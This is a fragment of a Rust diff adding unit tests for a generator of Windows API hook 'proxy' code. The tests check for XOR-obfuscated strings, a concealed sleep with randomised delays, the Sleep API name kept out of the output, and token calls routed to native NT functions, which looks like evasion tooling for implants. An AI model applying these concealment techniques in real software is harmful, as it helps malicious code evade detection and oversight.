+        assert!(block.contains("CONCEALING"), "{block}");
+        assert!(block.contains("const MIN_MS: u32 = 1000;"), "{block}");
+        assert!(block.contains("const MAX_MS: u32 = 600000;"), "{block}");
+        assert!(
+            !block.contains("want_module"),
+            "the hook matches by function name only: {block}"
+        );
+        assert!(!block.contains('$'), "leftover placeholder: {block}");
+        let code = code_only(&block);
+        assert!(!code.contains("tech_dbg"), "the proxy traces: {code}");
+        assert!(!code.contains("Sleep"), "the API name leaked: {code}");
+    }
+
     #[test]
     fn every_catalogue_entry_has_a_proxy_body() {
         for entry in CATALOGUE {
@@ -1552,6 +2327,27 @@ mod tests {
         assert!(block.contains("crate::nt_duplicate_token"), "{block}");
         assert!(block.contains("crate::nt_set_info_thread"), "{block}");
         assert!(!block.contains('$'), "leftover placeholder: {block}");
+    }
+
+    #[test]
+    fn open_process_token_rebuild_calls_the_three_argument_native() {
+        let config = proxy_config(&["advapi32!OpenProcessToken"]);
+        let block = render_block(&config, &xor_strings());
+        assert!(
+            block.contains("crate::nt_open_process_token(process, desired_access, token)"),
+            "{block}"
+        );
+    }
+
+    #[test]
+    fn duplicate_token_ex_does_not_pass_the_level_as_effective_only() {
+        let config = proxy_config(&["advapi32!DuplicateTokenEx"]);
+        let block = render_block(&config, &xor_strings());
+        assert!(block.contains("_impersonation_level: i32"), "{block}");
+        assert!(
+            block.contains("core::ptr::null(),\n            0,\n            token_type,"),
+            "{block}"
+        );
     }
 
     #[test]
